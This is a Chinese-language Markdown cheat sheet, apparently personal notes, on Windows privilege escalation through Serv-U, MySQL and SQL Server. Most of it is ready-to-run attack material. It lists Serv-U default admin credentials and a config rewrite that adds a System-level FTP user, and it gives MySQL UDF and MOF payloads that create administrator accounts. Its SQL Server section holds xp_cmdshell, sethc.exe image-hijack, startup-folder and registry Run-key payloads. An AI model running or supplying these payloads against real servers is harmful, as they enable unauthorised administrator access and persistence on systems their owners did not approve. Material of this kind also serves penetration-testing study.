# -提权summarize-
提权小结
## Serv-U提权
Serv-U提权，属于一种漏洞，该漏洞是使用Serv-u本地默认管理端口(43958)，以默认管理员登陆新建域和用户来执行命令。</br>
默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P</br>
一、serv-u ftp本地溢出权限提升(使用6.0以及以前版本)</br>
```
1、用Serv-U提权综合工具生成提权工具serv_u.exe
2、先上传 serv_u.exe 到一个盘符下 比如是d盘
3、执行命令 d:\serv_u.exe
4、d:\serv_u.exe “net user username password /add” (注意命令要有引号)
5、d:\serv_u.exe “net localgroup administrators username /add” (注意命令要有引号)
```
二、ServUDaemon.ini 文件重写后提权(对ServUDaemon.ini有写入的权限)。</br>
```
先修改Domain来添加用户
[Domain1]
User2=spider|1|0

然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：
[USER=spiger|1]
Password=sbd8b58b5c201ee5cc20f9a8551197d4a5
HomeDir=c:\
RelPaths=3
TimeOut=600
Maintenance=System
Access1=C:\|RWAMELCDP
Access2=d:\|RWAMELCDP
Access3=e:\|RWAMELCDP
SKEYValues=

添加上述代码并保存后，就会在serv-u中添加用户名为spiger，密码是123456。
通过在本地命令行执行ftp 目标IP地址  命令来连接目标FTP服务器。
连接后quote site exec net user spiger 123456 /add
quote site exec net localgroup administrators spiger /add
ps：上述添加的文件中最重要的是Maintenance=System这句，有了这句添加的FTP用户才是管理员用户，才会有命令执行权限（因为最后是通过FTFP执行命令来添加系统用户的）。
```
三、serv-u配置文件无修改权限,口令破解</br>
```
serv-u配置文件中Password字段就是用户口令加密变换后的字符串，破解方法：去掉前两位，剩下的进行md5破解，破解后再去掉前两位，剩下的就是FTP用户口令。
```

四、serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权（这是最常用的方法，一般大马中集成的serv-u提权方法就是本方法）</br>
```
serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。

下载serv-u目录下的ServUAdmin.exe文件，在本地用文本文件打开，查找LocalAdministrator字符来获取口令位置
```
参考:https://blog.csdn.net/Is0Man/article/details/51179637
## mysql提权
### udf提权
原理及思路:
```
   udf = ‘user defined function‘，即‘用户自定义函数’。</br>
   1. 将udf文件放到指定位置（Mysql>5.1放在Mysql根目录的lib\plugin文件夹下）
   2.从udf文件中引入自定义函数(user defined function)
   3.执行自定义函数
````
过程:
```
首先判断mysql版本，</br>
mysql版本 < 5.2 , UDF导出到系统目录c:/windows/system32/<br>
mysql版本 > 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\ </br>

select @@basedir;  #查看mysql安装目录
select 'It is dll' into dumpfile 'C:\。。lib::';  #利用NTFS ADS创建lib目录
select 'It is dll' into dumpfile 'C:\。。lib\plugin::';  #利用NTFS ADS创建plugin目录
select 0xUDFcode into dumpfile 'C:\phpstu\MySQL\lib\plugin\mstlab.dll';  #导出udfcode，注意修改udfcode
create function cmdshell returns string soname 'mstlab.dll';   #用udf创建cmd函数，shell,sys_exec,sys_eval
select shell('cmd','net user');     #执行cmd命令
show variables like '%plugin%';     #查看plugin路径
```
小技巧：
```
1.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MySQL 注册表中ImagePath的值为mysql安装目录
2.my.ini中datadir的值是数据存放目录
3.UPDATE user set File_priv ='Y';  flush privileges; 强制加file权限
```
参考:
```
https://bugs.hacking8.com/tiquan/?m=sql-udf
http://www.mamicode.com/info-detail-2294087.html
https://www.cnblogs.com/xishaonian/p/6016486.html
```
### mof提权
原理及思路:
```
利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行
    1.运行 MOF 文件指定为命令行参数将 Mofcomp.exe 文件。
    2.使用 IMofCompiler 接口和 $ CompileFile 方法。
    3.拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。
    条件：
    操作系统版本低于Windows Server 2008;
    mysql 版本低于5.7
```
脚本 和 命令:
```
#pragma namespace("\\.\root\subscription") 

instance of __EventFilter as  
{ 
    EventNamespace = "Root\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 

instance of ActiveScriptEventConsumer as  
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\") WSH.run(\"net.exe user admintony admin /add&&net.exe localgroup administrators admintony /add\")"; 
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = ; 
    Filter = ; 
}; 
保存为 1.mof
然后mysql执行：select load_file('D:/wwwroot/1.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
```
参考:https://www.cnblogs.com/wh4am1/p/6613770.html

## sqlserver提权
### sa提权
直接payload
```
1.判断扩展存储是否存在：
  select count(*) from master.dbo.sysobjects where xtype = 'x' AND name= 'xp_cmdshell'
  select count(*) from master.dbo.sysobjects where name='xp_regread'
  恢复：
  exec sp_dropextendedproc 'xp_cmdshell'
  exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'
  EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;(SQL2005)
2.列目录：
  exec master..xp_cmdshell 'ver'
  (or) exec master..xp_dirtree 'c:\',1,1
  (or) drop table black
       create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))-- 
       insert into black exec master..xp_cmdshell 'dir c:\' 
       select top 1 mulu from black where id=1
xp_cmdshell被删除时，可以用(4.a)开启沙盒模式，然后(4.b)方法提权
3.备份启动项：
  alter database [master] set RECOVERY FULL
  create table cmd (a image)
  backup log [master] to disk = 'c:\cmd1' with init
  insert into cmd (a) values (0x(batcode))
  backup log [master] to disk = 'C:\Documents and Settings\Administrator\「开始」菜单\程序\启动\start.bat'
  drop table cmd
4.映像劫持
  xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'
5.沙盒模式提权：
  法a：exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet.0\Engines','SandBoxMode','REG_DWORD',0; #关闭沙盒模式
  法b：Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user mstlab mstlab /add")'); #or c:\windows\system32\ias\dnary.mdb string类型用此。
开启OpenRowSet：exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;
6.xp_regwrite操作注册表
  exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\currentversion un','black','REG_SZ','net user test test /add'
  开启xp_oacreate:exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;
```
参考:https://bugs.hacking8.com/tiquan/?m=sql-sa

未完待续...
